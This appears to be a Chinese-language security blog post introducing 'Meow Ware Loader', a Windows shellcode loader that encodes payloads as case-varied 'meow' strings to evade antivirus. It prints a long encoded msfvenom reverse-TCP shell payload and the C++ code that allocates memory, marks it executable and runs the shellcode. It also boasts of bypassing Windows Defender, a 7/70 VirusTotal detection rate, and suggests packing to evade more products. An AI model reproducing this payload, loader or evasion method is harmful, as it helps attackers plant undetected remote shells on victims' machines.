---
title: "Meow Ware Loader - A Windows Shellcode Loader with Meow meow"
date: 2022-02-28T13:02:57+08:00
draft: false
url: "/2022/02/28/meow-ware-loader/"
categories:
  - 資訊安全
  - Windows
  - 小玩具
showToc: true
TocOpen: false
---

一款會把 Shell Code 給轉成 meow meow 的 Shell Code 載入器。程式碼使用方式等請參考下方 GitHub 連結。

GitHub : [https://github.com/stevenyu113228/Meow-Ware-Loader](https://github.com/stevenyu113228/Meow-Ware-Loader)

現在，有許多的防毒軟體都會透過惡意程式碼的特徵 (例如 YARA RULE) 來進行捕捉，因此部分惡意程式會透過 Shell Code 形式，在執行時間再注入到記憶體中，透過這種方式來規避查緝。

不過現在也有許多防毒軟體開始支援掃描非執行檔的 Shell Code 程式，因此可以透過把 Shell Code 進行編碼，以規避查緝，並透過 Loader 來進行載入執行。

其實這個構想是我前天晚上睡到一半想到的，剛好想到說 Encode 通常大家都愛用什麼 Base64、ROT13 這類現有的編碼方式，而防毒軟體在已知的狀況下很有可能也可以進行自動解碼，因此我想到了自創的 Meow Encode 法。

## Meow Encode Method

我們知道 Meow 總共有 4 個英文字母，而如果考量到小大寫的話，總共有  2^4 = 16 種組合。我們也可以直接把大小寫當作二進位來看，小寫是 0 、 大寫是 1。因此對照表如下

MeowBinaryDecimalHexadecimalmeow000000meoW000111meOw001022meOW001133mEow010044mEoW010155mEOw011066mEOW011177Meow100088MeoW100199MeOw101010aMeOW101111bMEow110012cMEoW110113dMEOw111014eMEOW111115f

因此，編碼後的 Shell Code 會長的類似這個樣子，下面為  msfvenom 的 `shell_reverse_tcp` 範例

```
MEOWMEowMEOwMeowMeowmeOwmeowmeowmeowmeowmeowmeowmEOwmeowMeowMeoWMEOwmEoWmeOWmeoWMEowmeowmEOwmEowMeowMeOWmEoWmeowmeOWmeowMeowMeOWmEoWmeOwmeowMEowMeowMeOWmEoWmeOwmeoWmEowMeowMeOWmEOWmeOwmeOwMeowmeowMEOWMeOWmEOWmEowMeOwmeOwmEOwmeOWmeoWMEOWMEOWMeOwMEowmeOWMEowmEOwmeoWmEOWMEowmeowmeOwmeOwMEowmeOwmeowMEowmeoWMEowMEOWmeowMEoWmeowmeoWMEowmEOWMEOwmeOwMEOWmeOwmEoWmeOwmEoWmEOWMeowMeOWmEoWmeOwmeoWmeowMeowMeOWmEowMeOwmeOWMEowMeowMeOWmEowMEowmeoWmeoWmEOWMeowMEOwmeOWmEowMeowmeowmeoWMEoWmeoWmEoWmeoWMeowMeOWmEoWMeoWmeOwmeowmeowmeoWMEoWmeOWMeowMeOWmEowMeoWmeoWMeowMEOwmeOWmeOWMeOwmEowMeoWMeowMeOWmeOWmEowMeowMeOWmeowmeoWMEoWmEOwmeOWmeoWMEOWMEOWMeOwMEowMEowmeoWMEowMEOWmeowMEoWmeowmeoWMEowmEOWmeOWMeowMEOwmeowmEOWmEoWMEOWmEOwmeowmeOWmEOWMEoWMEOWMeowmeOWMeOWmEOWMEoWmeOwmEowmEOWmEoWMEOwmEowmEoWMeowMeowMeOWmEoWMeowmeOwmEowmeowmeoWMEoWmeOWmEOwmEOwMeowMeOWmeowMEowmEowMeOWMeowMeOWmEoWMeowmeoWMEowmeowmeoWMEoWmeOWMeowMeOWmeowmEowMeowMeOWmeowmeoWMEoWmeowMeowMeoWmEowmEowmeOwmEowmeOwmEowmEoWMeOWmEoWMeOWmEOwmeoWmEoWMeoWmEoWMeOwmEoWmeoWMEOWMEOWMEOwmeowmEoWMEOWmEoWMEOWmEoWMeOwMeowMeOWmeoWmeOwMEOwMeOWMeowMEoWmEoWMEoWmEOwMeowmeOWmeOWmeOWmeOwmeowmeowmeowmeowmEOwMeowmEOWmEOWmEOWmeOWmeOWmeOwmEoWMEOWmEoWmEowmEOwMeowmEowMEowmEOWmEOWmeOwmEOwmeowmEOWMEOWMEOWMEoWmEoWMeOWMeowMeoWmeowmeowmeoWmeowmeowmeowmeowmeOwMeoWMEowmEowmEoWmEowmEoWmeowmEOwMeowmeOwMeoWMeowmeowmEOwMeOWmeowmeowMEOWMEOWMEoWmEoWmEoWmeowmEoWmeowmEoWmeowmEoWmeowmEowmeowmEoWmeowmEowmeowmEoWmeowmEOwMeowMEOwMeOwmeowMEOWMEoWMEOWMEOwmeowMEOWMEOWMEoWmEoWMeoWmEOWmEOwMeOwmeowmEoWmEOwMeowMEowmeowMeOwMeowmeOwMeowMeowmeoWmEOwMeowmeowmeOwmeowmeowmeOwmEowMEOwMEoWMeowMeoWMEOwmEOwmEOwMeOwmeoWmeowmEoWmEOwmEoWmEOWmEOwMeowMeoWMeoWMeOwmEoWmEOWmEowmEOwmeoWMEOWMEOWMEoWmEoWMeowmEoWMEowmeowmEOWmEowmeowMEowMEOWMEOWmEowMEOwmeowMeowmEOWmEoWMEOwMEowmEOwMeowMEOWmeowMeOWmEoWMeOwmeOwmEoWmEOwMEOWMEOWMEoWmEoWmEOwMeowmEOwmeOWmEOwMEoWmEOwmEowmeowmeowMeowMeoWMEOwmeOWmEoWmEOWmEoWmEOWmEoWmEOWmeOWmeoWMEOWmEOwmEOwMeOwmeoWmeOwmEoWMeoWmEoWmEOwMEOwmeOwMEOWMEoWmEOwmEOwMEowmEOWmEowmEowmeOwmEowmeOWMEowmeowmeoWmeowmeoWMeowMEoWmEowmEowmeOwmEowmeoWmeowMEowmEOwmeowmeowmEowmEowmEoWmEowmEoWmeowmEoWmEOwmEoWmEOwmEoWmEOwmEowmEOwmEoWmEOwmEowMEOwmEoWmEOwmEoWmEOwmEoWmeOWmEoWmEOwmEOwMeowmEOWMeoWMEowMEowmeOWMEOWMeowmEOwMEOWMEOWMEoWmEoWMeowMeoWMEOwmeowmEowMEOwmEoWmEOwmEowmEOwMEOWMEOWmeOWmeowmEOwMeowmeowMeowMeowmEOWmeoWMEoWmEOwmeowMEOWMEOWMEoWmEoWMeOWMeOWMEOWmeowMeOWmEoWMeOwmeOwmEoWmEOwmEOwMeowMeOwmEOwMeoWmEoWMeOWMEoWMeoWMEoWMEOWMEOWMEoWmEoWmeOWMEowmeowmEOwmEOWMEowmeowMeOwMeowmeowMEOWMeOWMEOwmeowmEOWmEoWmeowmEoWMeOWMeOWmEowmEOWmeoWmeOWmEOWmeOwmEOwMEOWmEOwMeOwmeowmeowmEoWmeOWMEOWMEOWMEoWm
```

## Shell Code Loader

```cpp
void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
memcpy(exec, shellcode, memory_allocation);

VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
(*(void (*)()) exec)();
```

這邊我~~參考~~抄了 [DimopoulosElias](https://github.com/DimopoulosElias) 大大寫的 [SimpleShellcodeInjector](https://github.com/DimopoulosElias/SimpleShellcodeInjector) 程式碼，其中重點是下面這幾行

首先透過 Windows 的 API  `VirtualAlloc` 申請一塊記憶體空間，`MEM_RESERVE` 保留指定的記憶體空間，`MEM_COMMIT` 標記分配程式使用的記憶體。

```cpp
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

接下來透過 memcpy 把 shellcode 給貼到申請好的記憶體空間中，並透過 `VirtualProtect` 設定 `PAGE_EXECUTE` 設定該區域為可執行的程式碼，最後執行 Shell Code。

最後我使用 msfvenom 的 `shell_reverse_tcp` 進行實驗，可以順利的 Bypass Windows Defender。

![](/uploads/2022/02/2022-02-28-00-56-35-1024x409.png)

並在 VirusTotal 上有 (7/70) 的[表現](https://www.virustotal.com/gui/file/ee0fcc459241ebd6f3d269c046763f09920c7f78f7b68ff5f98ab6b5325f155d?nocache=1) 理論上把程式碼加殼或是再次設法混淆 Loader 的部分，就可以 Bypass 更多的防毒，而可想而知，被 Meow Meow Encode 過後的 Shell Code 可以 All pass 所有防毒。

![](/uploads/2022/02/2022-02-28-01-01-17-1024x511.png)
